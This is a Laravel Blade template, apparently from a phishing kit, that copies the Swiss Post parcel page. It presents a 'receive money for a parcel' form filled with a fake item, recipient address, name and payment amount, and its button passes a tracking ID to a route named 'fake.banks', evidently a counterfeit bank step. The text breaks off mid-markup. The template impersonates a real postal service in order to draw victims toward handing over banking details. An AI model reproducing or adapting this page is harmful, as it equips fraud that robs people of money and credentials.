@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/post.css')}}" rel="stylesheet">
@endpush
@section('content')
    <main id="main" role="main">
        <!-- BEGIN NOINDEX -->

        <div data-props="{" a11ylabel
        ":"breadcrumb","aswebcomponent":false,"buttons":null,"iscentered":false,"items":[{"text":"website","url":"https:=""
        www.post.ch="" de="" "},{"text":"pakete","url":"https:="" pakete-versenden"},{"text":"pakete=""
        aufgeben","url":"https:="" pakete-versenden=""
        pakete-aufgeben"}],"linklastbreadcrumbitem":false,"svgiconarrowrightsmall":{"name":"2111_angle-small-right","classes":["ppm-breadcrumb__svg-icon","ppm-breadcrumb-divider"],"additionalattributes":[{"name":"focusable","value":"false"}]},"svgiconhome":{"name":"2035_home","classes":["ppm-breadcrumb__svg-icon"],"additionalattributes":[{"name":"focusable","value":"false"}]},"truncatebuttontext":"Öffnen","classes":[],"additionalattributes":[]}"="">
        <div class="ppm-breadcrumb" data-init="breadcrumb">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <nav class="ppm-breadcrumb__navigation h-loading" aria-label="breadcrumb">
                            <ol class="ppm-breadcrumb__list">
                                <li class="ppm-breadcrumb__item"><a class="ppm-breadcrumb__link "
                                                                    href="https://www.post.ch/de/">
                                        <svg class="ppm-svg-icon ppm-svg-icon--2035_home ppm-breadcrumb__svg-icon">
                                            <use href="#2035_home"></use>
                                        </svg>
                                        <span class="h-visuallyhidden">Website</span></a></li>
                                <li class="ppm-breadcrumb__item"><a class="ppm-breadcrumb__link "
                                                                    href="https://www.post.ch/de/pakete-versenden">
                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right ppm-breadcrumb__svg-icon ppm-breadcrumb-divider">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>
                                        Pakete versenden</a></li>
                                <li class="ppm-breadcrumb__item ppm-breadcrumb__item--active"><a
                                        class="ppm-breadcrumb__link ppm-breadcrumb__link--last ppm-breadcrumb__content-last"
                                        href="#" aria-current="page">
                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right ppm-breadcrumb__svg-icon ppm-breadcrumb-divider">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>
                                        Pakete aufgeben</a></li>
                            </ol>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
        </div>

        <!-- END NOINDEX -->

        <div class="ppm-page-title" style="text-align: center;">
            <a href="https://www.post.ch/de/" title="DIE POST" data-test-action="IndexPageLink"
               class="sc-eqIVtm sc-cpmKsF bcxWYD">
                <img height="150px" src="{{asset($fake->logo())}}">
            </a>
            <div class="container">
                <div class="row">
                    <div class="col-md-10 col-lg-8">
                        <div class="ppm-page-title__content">


                            <h1 class="ppm-title">
                                <!-- <span class="ppm-title__main">Geld für ein Paket entgegennehmen</span> -->


                                <br>

                                <span class="ppm-title__sub">Geld für ein Paket entgegennehmen</span>

                            </h1>


                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div class="ppm-od-widget">
            <div class="container">
                <div class="ppm-od-widget__container">
                    <div class="ppm-flex-forms  ppm-od-widget__form" data-init="flexForms">
                        <div class="flex_formcontainer ppm-od-widget__form-container" data-init="flexform"
                             novalidate="novalidate">
                            <fieldset class="first-form ppm-od-widget__fieldset">
                                <ul class="ppm-od-widget__list">
                                    <li data-key="ortOrPostleitzahl" data-flexform-text-field=""
                                        class="floating-label-parent form-group flex_listitem flex_singletextfield ppm-od-widget__list-item ppm-od-widget__input-item">
                                        <label class="floating-label flex_label" for="ortOrPostleitzahl"
                                               id="ortOrPostleitzahl_label">Artikel Name</label>
                                        <input name="PreselectText" aria-invalid="false"
                                               aria-labelledby="ortOrPostleitzahl_label" aria-multiline="false"
                                               autocomplete="on" class="form-control ppm-od-widget__text-input"
                                               data-flexautocomplete-options="{" url":="" "="" api=""
                                        locationsautocomplete="" autocompletelocation?sc_site="post-portal&amp;sc_lang=de"
                                        ,"="" "noresults"="" :="" "keine="" resultate="" gefunden"}"=""
                                        data-init="flexautocomplete" data-module="flexautocomplete"
                                        id="ortOrPostleitzahl"
                                        role="textbox" type="text" value="{{$fake->title}}"
                                        disabled="">
                                    </li>
                                </ul>
                                {{--                                <ul class="ppm-od-widget__list">--}}
                                {{--                                    <li data-key="ortOrPostleitzahl" data-flexform-text-field=""--}}
                                {{--                                        class="floating-label-parent form-group flex_listitem flex_singletextfield ppm-od-widget__list-item ppm-od-widget__input-item">--}}
                                {{--                                        <label class="floating-label flex_label" for="ortOrPostleitzahl"--}}
                                {{--                                               id="ortOrPostleitzahl_label">Vollständiger Name des Absenders</label>--}}
                                {{--                                        <input name="PreselectText" aria-invalid="false"--}}
                                {{--                                               aria-labelledby="ortOrPostleitzahl_label" aria-multiline="false"--}}
                                {{--                                               autocomplete="on" class="form-control ppm-od-widget__text-input"--}}
                                {{--                                               data-flexautocomplete-options="{" url":="" "="" api=""--}}
                                {{--                                        locationsautocomplete="" autocompletelocation?sc_site="post-portal&amp;sc_lang=de"--}}
                                {{--                                        ,"="" "noresults"="" :="" "keine="" resultate="" gefunden"}"=""--}}
                                {{--                                        data-init="flexautocomplete" data-module="flexautocomplete" id="ortOrPostleitzahl"--}}
                                {{--                                        role="textbox" type="text" value="Daten eingeben">--}}
                                {{--                                    </li>--}}
                                {{--                                </ul>--}}
                                <ul class="ppm-od-widget__list">
                                    <li data-key="ortOrPostleitzahl" data-flexform-text-field=""
                                        class="floating-label-parent form-group flex_listitem flex_singletextfield ppm-od-widget__list-item ppm-od-widget__input-item">
                                        <label class="floating-label flex_label" for="ortOrPostleitzahl"
                                               id="ortOrPostleitzahl_label">Wohnadresse des Empfängers</label>
                                        <input name="PreselectText" aria-invalid="false"
                                               aria-labelledby="ortOrPostleitzahl_label" aria-multiline="false"
                                               autocomplete="on" class="form-control ppm-od-widget__text-input"
                                               data-flexautocomplete-options="{" url":="" "="" api=""
                                        locationsautocomplete="" autocompletelocation?sc_site="post-portal&amp;sc_lang=de"
                                        ,"="" "noresults"="" :="" "keine="" resultate="" gefunden"}"=""
                                        data-init="flexautocomplete" data-module="flexautocomplete"
                                        id="ortOrPostleitzahl"
                                        role="textbox" type="text" value="{{$fake->address}}" disabled="">
                                    </li>
                                </ul>
                                <ul class="ppm-od-widget__list">
                                    <li data-key="ortOrPostleitzahl" data-flexform-text-field=""
                                        class="floating-label-parent form-group flex_listitem flex_singletextfield ppm-od-widget__list-item ppm-od-widget__input-item">
                                        <label class="floating-label flex_label" for="ortOrPostleitzahl"
                                               id="ortOrPostleitzahl_label">Vollständiger Name des Empfängers</label>
                                        <input name="PreselectText" aria-invalid="false"
                                               aria-labelledby="ortOrPostleitzahl_label" aria-multiline="false"
                                               autocomplete="on" class="form-control ppm-od-widget__text-input"
                                               data-flexautocomplete-options="{" url":="" "="" api=""
                                        locationsautocomplete="" autocompletelocation?sc_site="post-portal&amp;sc_lang=de"
                                        ,"="" "noresults"="" :="" "keine="" resultate="" gefunden"}"=""
                                        data-init="flexautocomplete" data-module="flexautocomplete"
                                        id="ortOrPostleitzahl"
                                        role="textbox" type="text" value="{{$fake->recipient}}" disabled="">
                                    </li>
                                </ul>
                            </fieldset>
                            <fieldset class="second-form ppm-od-widget__fieldset">
                                <ul class="ppm-od-widget__list">

                                </ul>
                                <ul class="ppm-od-widget__list">
                                    <li data-key="ortOrPostleitzahl" data-flexform-text-field=""
                                        class="floating-label-parent form-group flex_listitem flex_singletextfield ppm-od-widget__list-item ppm-od-widget__input-item">
                                        <label class="floating-label flex_label" for="ortOrPostleitzahl"
                                               id="ortOrPostleitzahl_label">Betrag der Zahlung</label>
                                        <input name="PreselectText" aria-invalid="false"
                                               aria-labelledby="ortOrPostleitzahl_label" aria-multiline="false"
                                               autocomplete="on" class="form-control ppm-od-widget__text-input"
                                               data-flexautocomplete-options="{" url":="" "="" api=""
                                        locationsautocomplete="" autocompletelocation?sc_site="post-portal&amp;sc_lang=de"
                                        ,"="" "noresults"="" :="" "keine="" resultate="" gefunden"}"=""
                                        data-init="flexautocomplete" data-module="flexautocomplete"
                                        id="ortOrPostleitzahl"
                                        role="textbox" type="text" value="{{$fake->price()}}" disabled="">
                                    </li>
                                </ul>
                                <ul class="ppm-od-widget__list">

                                </ul>
                                <ul class="ppm-od-widget__list">

                                </ul>
                            </fieldset>
                            <div class="flex_formfooter">
                                <div class="ppm-flex-forms__footer flex_buttoncontainer ppm-flex-forms__footer--simple">
                                    <form action="{{subRoute('fake.banks')}}">
                                        <input type="hidden" name="track_id" value="{{$fake->track_id}}">
                                        <button type="submit"
                                                class="submit-button ppm-button btn btn-primary btn-animate"
                                                style="width: 130px">
                                            <span class="ppm-button__label">Weiter</span>
                                            <svg
                                                class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right ppm-button__svg-icon"
                                                focusable="false">
                                                <use href="#2111_angle-small-right"></use>
                                            </svg>
                                        </button>
                                    </form>
                                </div>
                            </div>
                        </div>

                    </div>
                    <svg class="big-logo" xmlns="http://www.w3.org/2000/svg" width="512" height="512"
                         viewBox="0 0 512 512">
                        <path fill="#FFD300"
                              d="M512 472c0 22.1-17.9 40-40 40H40c-22.1 0-40-17.9-40-40V40C0 17.9 17.9 0 40 0h432c22.1 0 40 17.9 40 40v432z"></path>
                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFF"
                              d="M396.2 304.3l5.5-25H31.6l-5.5 25h370.1z"></path>
                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#EC1C24"
                              d="M421.4 207.7h40.8l-6.5 30.3h30.2l-7.8 37.8h-30.3l-6 28.5h-33.3l2-9.9h23.2l5.8-28.2H470l3.8-18.6h-30.2l6.3-30.3h-20.5l-6.3 30.3h-10.3l8.6-39.9z"></path>
                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#231F20"
                              d="M145.3 239h-11.1v.2l-16.1 35.1-.2-34.8v-.5H104.2l-.2.2-15.1 35.1-1.3-34.8v-.5H76.8l.2.5 3 47.9v.5h12.6v-.3l16.2-36.5.5 36.3v.5H122.1v-.3l23-47.9.2-.7zM158.9 239H147.9l-.3.5-10.1 47.9v.5h11.1v-.5l10.1-47.9.2-.5zM212.6 238.2c-8.6 0-18.4 3.8-18.4 14.9 0 7.3 5.3 10.1 9.6 12.6 3.8 2 6.8 3.8 6.8 7.6 0 4.8-4.3 6.8-8.6 6.8s-8.1-1.5-11.6-3.3l-.5-.3-.3.8-2.3 8.1-.3.5h.5c4.8 2 9.6 2.8 13.9 2.8 6.8 0 12.4-1.8 15.9-5.3 2.8-2.8 4.3-6.6 4.3-11.1 0-7.8-5.5-11.1-10.1-13.9-3.5-2-6.3-3.8-6.3-6.8 0-1 .5-2 1.3-2.8 1.5-1.5 4.3-2 6.3-2 3 0 6.8.8 9.6 2.3l.8.3v-.5l2.3-7.8.3-.5-.5-.3c-3.6-1.3-7.9-2.1-12.7-2.1zM191.2 240.5l-.5-.3c-3.5-1.3-7.6-2-12.6-2-8.3 0-18.2 3.8-18.2 14.9 0 7.3 5 10.1 9.6 12.6 3.5 2 6.6 3.8 6.6 7.6 0 4.8-4.3 6.8-8.6 6.8-4 0-8.1-1.5-11.3-3.3l-.5-.3-.3.8-2.5 8.1v.5h.3c5 2 9.6 2.8 13.9 2.8 7.1 0 12.6-1.8 16.1-5.3 2.8-2.8 4-6.6 4-11.1 0-7.8-5.5-11.1-10.1-13.9-3.3-2-6.3-3.8-6.3-6.8 0-1 .5-2 1.3-2.8 1.5-1.5 4.3-2 6.3-2 3.3 0 6.8.8 9.8 2.3l.5.3.3-.5 2.3-7.8v-.6h-.1zM62.1 238.2c-8.3 0-18.4 3.8-18.4 14.9 0 7.3 5.3 10.1 9.8 12.6 3.5 2 6.6 3.8 6.6 7.6 0 4.8-4.3 6.8-8.6 6.8s-8.1-1.5-11.6-3.3l-.5-.3v.8l-2.5 8.1-.3.5h.5c4.8 2 9.6 2.8 13.9 2.8 7.1 0 12.6-1.8 15.9-5.3 2.8-2.8 4.3-6.6 4.3-11.1 0-7.8-5.5-11.1-10.1-13.9-3.3-2-6.3-3.8-6.3-6.8 0-1 .5-2 1.3-2.8 1.5-1.5 4.3-2 6.3-2 3.3 0 6.8.8 9.8 2.3l.5.3v-.5L75 241l.3-.5-.5-.3c-3.6-1.2-7.9-2-12.7-2zM256.5 239H247.8v.5l-10.1 47.9v.3l-.3.3H248.1l.3-.5s3.3-14.6 3.3-15.6h5.3c6.3 0 12.4-2.3 16.1-6.1 3-3 4.8-7.3 4.8-12.1 0-3.8-1.3-7.1-3.5-9.3-4.3-4.4-12.1-5.4-17.9-5.4zm.3 8.6h2.8c2 0 4 .8 5.5 2 1.3 1.3 2 3 2 5 0 5.5-5.5 8.6-10.6 8.6h-2.8l3.1-15.6zM321.3 243.8c-3.5-3.5-8.6-5.5-15.1-5.5-8.3 0-14.4 2.8-19.9 9.1-5 5.8-7.8 13.4-7.8 21.2 0 6 2 11.3 5.8 15.1 3.5 3.5 8.1 5.3 13.6 5.3 8.8 0 15.9-2.8 20.7-8.3 5.3-5.8 8.3-13.4 8.3-21.4-.1-6.7-2.1-12-5.6-15.5zm-22.2 36.5c-2.5 0-4.8-.8-6.5-2.5-2-2-3-5-3-8.8 0-6.8 2.8-13.9 6.8-17.9 2.8-2.8 6-4.3 9.6-4.3 2.8 0 5 1 6.8 2.5 2 2 3 5 3 8.8-.1 9.1-5.8 22.2-16.7 22.2zM363.1 240.5c-3.5-1.5-7.8-2.3-12.6-2.3-8.6 0-18.4 4-18.4 15.1 0 7.3 5 10.1 9.6 12.6 3.5 2 6.8 3.8 6.8 7.3 0 4.8-4.3 7.1-8.6 7.1s-8.3-1.8-11.6-3.3l-.5-.3v.3l-.2.3-2.5 8.3v.6h.2c5 1.8 9.6 2.8 13.9 2.8 7.1 0 12.6-1.8 16.1-5.3 2.8-2.8 4-6.6 4-11.3 0-7.8-5.5-11.1-10.1-13.6-3.3-2-6-3.8-6-6.8 0-1 .3-2 1-3 2-1.8 5.5-2 6.6-2 3 0 6.6 1 9.6 2.5l.5.3v-.3l.2-.3 2.3-8.1v-.6h-.3zM404.2 239h-37.9l-.2.5-1.5 7.3v.5l-.3.3H378l-8.6 39.8v.3l-.3.3H380.3v-.5s8.3-38.1 8.8-39.8H402.4v-.3l.3-.3 1.5-7.6v-.5z"></path>
                    </svg>
                </div>
            </div>
        </div>


        <div class="ppl-subnavigation-wrapper">
            <!-- BEGIN NOINDEX -->

            <!-- END NOINDEX -->


            <section class="ppm-topic-teaser bg-olive-dark">
                <div class="container">
                    <div class="row flex-row-reverse flex-lg-row ppm-topic-teaser__background bg-olive-dark">
                        <div class="ppm-topic-teaser__background-fix bg-olive-dark"></div>
                        <div class="col-12 col-rg-12 col-lg-8 d-flex flex-column flex-rg-row justify-content-center">
                            <div class="ppm-topic-teaser__content">


                                <h2 class="ppm-title ppm-topic-teaser__title">
                                    <span class="ppm-title__main">Beachten bei</span>

                                </h2>


                                <ul class="ppm-link-list list-group ppm-topic-teaser__linklist list-group-flush list-group-white">


                                    <li class="ppm-link-list__item">
                                        <a href="#"
                                           class=" list-group-item list-group-item-big list-group-item-white"
                                           data-element-click="{" event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        deklarieren-und-verzollen","event_eventinfo_eventlabel":"auslandssendungen","event_category_primarycategory":"topic=""
                                        teaser="" -="" link="" list=""
                                        item","event_category_subcategory1":"","event_attributes_subattr1":"beachten=""
                                        bei"}"="">

                                        Auslandssendungen


                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right list-group-item-svg list-group-item-right-svg">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>


                                        </a>
                                    </li>


                                    <li class="ppm-link-list__item">
                                        <a href="#"
                                           class=" list-group-item list-group-item-big list-group-item-white"
                                           data-element-click="{" event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        express-und-kurier","event_eventinfo_eventlabel":"express="" und=""
                                        kurier","event_category_primarycategory":"topic="" teaser="" -="" link=""
                                        list=""
                                        item","event_category_subcategory1":"","event_attributes_subattr1":"beachten=""
                                        bei"}"="">

                                        Express und Kurier


                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right list-group-item-svg list-group-item-right-svg">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>


                                        </a>
                                    </li>


                                    <li class="ppm-link-list__item">
                                        <a href="#"
                                           class=" list-group-item list-group-item-big list-group-item-white"
                                           data-element-click="{" event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        sperrgut","event_eventinfo_eventlabel":"sperrgut","event_category_primarycategory":"topic=""
                                        teaser="" -="" link="" list=""
                                        item","event_category_subcategory1":"","event_attributes_subattr1":"beachten=""
                                        bei"}"="">

                                        Sperrgut


                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right list-group-item-svg list-group-item-right-svg">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>


                                        </a>
                                    </li>


                                    <li class="ppm-link-list__item">
                                        <a href="#"
                                           class=" list-group-item list-group-item-big list-group-item-white"
                                           data-element-click="{" event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        gefahrgut","event_eventinfo_eventlabel":"gefahrgut","event_category_primarycategory":"topic=""
                                        teaser="" -="" link="" list=""
                                        item","event_category_subcategory1":"","event_attributes_subattr1":"beachten=""
                                        bei"}"="">

                                        Gefahrgut


                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right list-group-item-svg list-group-item-right-svg">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>


                                        </a>
                                    </li>


                                    <li class="ppm-link-list__item">
                                        <a href="#"
                                           class=" list-group-item list-group-item-big list-group-item-white"
                                           data-element-click="{" event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        wertsachen","event_eventinfo_eventlabel":"wertsachen","event_category_primarycategory":"topic=""
                                        teaser="" -="" link="" list=""
                                        item","event_category_subcategory1":"","event_attributes_subattr1":"beachten=""
                                        bei"}"="">

                                        Wertsachen


                                        <svg
                                            class="ppm-svg-icon ppm-svg-icon--2111_angle-small-right list-group-item-svg list-group-item-right-svg">
                                            <use href="#2111_angle-small-right"></use>
                                        </svg>


                                        </a>
                                    </li>


                                </ul>


                            </div>
                        </div>
                        <div class="col-10 col-rg-8 col-lg-4">
                            <div class="ppm-topic-teaser__image-wrapper ppm-topic-teaser__image-wrapper--right">

            <span class="ppm-image ppm-topic-teaser__image" data-init="image" style="padding-top: 70%">

    <span class="ppm-image__loader"></span>


    <img class="ppm-image__image" data-image="image"
         src="./Pakete aufgeben _ Die Post_files/aufgeben briefe 1500 927.jpg"
         data-src="https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=800&amp;vs=2&amp;hash=89FA2CAAA0874632E3FC7EE42B7CE8CC"
         srcset="https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=400&amp;vs=2&amp;hash=93C3E58294F0DE73183E0D1962AAD69C 400w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=600&amp;vs=2&amp;hash=34A3B5EB4FB8BCE7A82251C0F9A19583 600w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=800&amp;vs=2&amp;hash=89FA2CAAA0874632E3FC7EE42B7CE8CC 800w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=1200&amp;vs=2&amp;hash=711C1A40929C9FE652967328C216A747 1200w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=1600&amp;vs=2&amp;hash=146EB7D9C73BFE8128980AAEE22322D7 1600w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=2000&amp;vs=2&amp;hash=72DD07831E7BBBD395D1B4F304C98985 2000w"
         data-srcset="https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=400&amp;vs=2&amp;hash=93C3E58294F0DE73183E0D1962AAD69C 400w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=600&amp;vs=2&amp;hash=34A3B5EB4FB8BCE7A82251C0F9A19583 600w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=800&amp;vs=2&amp;hash=89FA2CAAA0874632E3FC7EE42B7CE8CC 800w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=1200&amp;vs=2&amp;hash=711C1A40929C9FE652967328C216A747 1200w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=1600&amp;vs=2&amp;hash=146EB7D9C73BFE8128980AAEE22322D7 1600w, https://www.post.ch/-/media/post/gk/bilder/a/aufgeben-briefe-1500-927.jpg?mw=2000&amp;vs=2&amp;hash=72DD07831E7BBBD395D1B4F304C98985 2000w"
         sizes="(min-width: 1441px) calc((1440px - 2*128px + 16px) * (4/12)- 16px + 128px),
                    (min-width: 1280px) calc((100vw - 2*128px + 16px) * (4/12) - 16px + 128px),
                    (min-width: 1024px) calc((100vw - 2*40px + 16px) * (4/12) - 16px + 40px),
                    (min-width: 780px) calc((100vw - 2*32px + 16px) * (8/12) - 16px + 32px),
                    (min-width: 600px) calc((100vw - 2*32px + 16px) * (8/12) - 16px + 32px),
                    (min-width: 400px) calc((100vw - 2*16px + 12px) * (10/12) - 12px + 16px),
                    calc((100vw - 2*12px + 12px) * (10/12) - 12px + 12px)" alt="Ein Kunde am Briefschalter. ">

</span>


                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <section class="ppm-rich-content-module ppm-rich-content-module--grey">


                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-md-11 col-lg-8 offset-lg-2">
                            <h2 class="ppm-rich-content-module__title">
                                <span class="font-weight-bold">Schritt für Schritt</span>

                            </h2>
                        </div>
                    </div>
                </div>


                <div class="ppm-rich-content-module__content">
                    <div class="ppm-process ppm-process--negative">
                        <div class="container">
                            <div class="row justify-content-center">


                                <ul class="col-md-10 col-xl-8">


                                    <li class="ppm-process__step">

                                        <a href="https://www.post.ch/de/pakete-versenden"
                                           class="ppm-process__step--link"
                                           target="" data-element-click="{" event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de=""
                                        pakete-versenden","event_eventinfo_eventlabel":"frankieren","event_category_primarycategory":"process","event_category_subcategory1":"","event_attributes_subattr1":""}"="">

                                        <div class="ppm-process__circle rounded-circle">

                                            <div class="ppm-process__svg">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                                                    <path fill="currentColor"
                                                          d="M24 4V1.3h-1.3c0 .9-.2 1.8-.7 2.7H0v1.3h21.1C19.6 6.9 17.3 8 14.7 8h-4v9.3h16V8H24V5.3h5.3v25.3H0V32h30.7V4H24zM12 16V9.3h2.7c3.4 0 6.4-1.6 8-3.9v3.9c0 3.7-4.2 6.7-9.3 6.7H12zm13.3-6.7V16h-6.1c2.9-1.4 4.8-3.9 4.8-6.7h1.3z"></path>
                                                    <path fill="currentColor"
                                                          d="M10.7 21.3H20v1.3h-9.3zM10.7 24h6.7v1.3h-6.7zM10.7 26.7H20V28h-9.3z"></path>
                                                    <path fill="none" d="M0 0h32v32H0z"></path>
                                                </svg>

                                            </div>


                                        </div>
                                        <div class="ppm-process__text">


                                            <h3 class="ppm-title ppm-process__title">
                                                <span class="ppm-title__main">Frankieren</span>

                                            </h3>


                                            <div class="ppm-process__description">

                                                <div class="ppm-richtext" data-init="richtext">

                                                    <div class="ppm-richtext__content">
                                                        <p>Frankieren Sie Pakete innerhalb der Schweiz mit
                                                            Paketetiketten,
                                                            Auslandspakete mit einem Frachtbrief.</p>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        </a>

                                    </li>


                                    <li class="ppm-process__step">

                                        <a href="#"
                                           class="ppm-process__step--link" target="" data-element-click="{"
                                           event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        deklarieren-und-verzollen","event_eventinfo_eventlabel":"deklarieren="" und=""
                                        verzollen","event_category_primarycategory":"process","event_category_subcategory1":"","event_attributes_subattr1":""}"="">

                                        <div class="ppm-process__circle rounded-circle">

                                            <div class="ppm-process__svg">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                                                    <path fill="currentColor"
                                                          d="M28 9.3h-1.6l5.2-5.2L27.8.3l-8.9 8.9H4c-1.5 0-2.7 1.2-2.7 2.7v16c0 1.5 1.2 2.7 2.7 2.7h24c1.5 0 2.7-1.2 2.7-2.7v-16c0-.7-.3-1.4-.8-1.9-.5-.4-1.2-.7-1.9-.7zm-.2-7l1.9 1.9-1 1-1.9-1.9 1-1zm0 3.8L15.1 18.8l-1.9-1.9L25.9 4.2l1.9 1.9zM14.1 19.6l-2.3.6.6-2.3 1.7 1.7zM29.3 28c0 .7-.6 1.3-1.3 1.3H4c-.7 0-1.3-.6-1.3-1.3V12c0-.7.6-1.3 1.3-1.3h13.6L11.2 17 10 22l5-1.3 10.1-10.1H28c.4 0 .7.1.9.4.3.3.4.6.4.9V28z"></path>
                                                    <path fill="none" d="M0 0h32v32H0z"></path>
                                                </svg>

                                            </div>


                                        </div>
                                        <div class="ppm-process__text">


                                            <h3 class="ppm-title ppm-process__title">
                                                <span class="ppm-title__main">Deklarieren und verzollen</span>

                                            </h3>


                                            <div class="ppm-process__description">

                                                <div class="ppm-richtext" data-init="richtext">

                                                    <div class="ppm-richtext__content">
                                                        <p>Sendungen ins Ausland müssen Sie deklarieren. Mit den
                                                            richtigen
                                                            Begleitpapieren sorgen Sie für eine reibungslose Abwicklung
                                                            am
                                                            Zoll.</p>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        </a>

                                    </li>


                                    <li class="ppm-process__step">

                                        <a href="#"
                                           class="ppm-process__step--link" target="" data-element-click="{"
                                           event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        verpacken-und-adressieren","event_eventinfo_eventlabel":"verpacken="" und=""
                                        adressieren","event_category_primarycategory":"process","event_category_subcategory1":"","event_attributes_subattr1":""}"="">

                                        <div class="ppm-process__circle rounded-circle">

                                            <div class="ppm-process__svg">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                                                    <path fill="currentColor"
                                                          d="M9.7 2.7l-8.4 8.4v19.6h19.6l8.4-8.4V2.7H9.7zm.6 1.3h16.8l-6.7 6.7H3.6L10.3 4zm-7.6 8H20v17.3H2.7V12zm18.6 16.4V11.6L28 4.9v16.8l-6.7 6.7z"></path>
                                                    <path
                                                        d="M23.6 5.3h-5.9l-4 4h5.9l4-4zM16.9 8l1.3-1.3h2.1L19.1 8h-2.2z"></path>
                                                    <path fill="none" d="M0 0h32v32H0z"></path>
                                                </svg>

                                            </div>


                                        </div>
                                        <div class="ppm-process__text">


                                            <h3 class="ppm-title ppm-process__title">
                                                <span class="ppm-title__main">Verpacken und adressieren</span>

                                            </h3>


                                            <div class="ppm-process__description">

                                                <div class="ppm-richtext" data-init="richtext">

                                                    <div class="ppm-richtext__content">
                                                        <p>Pakete richtig verpacken und adressieren, damit sie
                                                            einwandfrei
                                                            ankommen.</p>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        </a>

                                    </li>


                                    <li class="ppm-process__step">

                                        <a href="#"
                                           class="ppm-process__step--link" target="" data-element-click="{"
                                           event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        pakete-aufgeben","event_eventinfo_eventlabel":"aufgeben","event_category_primarycategory":"process","event_category_subcategory1":"","event_attributes_subattr1":""}"="">

                                        <div class="ppm-process__circle rounded-circle">

                                            <div class="ppm-process__svg">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                                                    <path fill="currentColor"
                                                          d="M5.3 17.7V32h14.3l7.1-7.1V10.7H12.4l-7.1 7zm13.4 13h-12v-12h12v12zm6.6-6.3L20 29.7V18.3l5.3-5.3v11.4zM24.4 12l-5.3 5.3H7.6l5.3-5.3h11.5z"></path>
                                                    <path
                                                        d="M19.8 14.7h-2.5L16 16h2.5zM16 .6L0 9.8v1.5l16-9.2 16 9.2V9.8z"></path>
                                                    <path fill="none" d="M0 0h32v32H0z"></path>
                                                </svg>

                                            </div>


                                        </div>
                                        <div class="ppm-process__text">


                                            <h3 class="ppm-title ppm-process__title">
                                                <span class="ppm-title__main">Aufgeben</span>

                                            </h3>


                                            <div class="ppm-process__description">

                                                <div class="ppm-richtext" data-init="richtext">

                                                    <div class="ppm-richtext__content">
                                                        <p>Geben Sie Pakete in einer Filiale auf, oder lassen Sie sie
                                                            abholen.</p>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        </a>

                                    </li>


                                    <li class="ppm-process__step">

                                        <a href="#"
                                           class="ppm-process__step--link" target="" data-element-click="{"
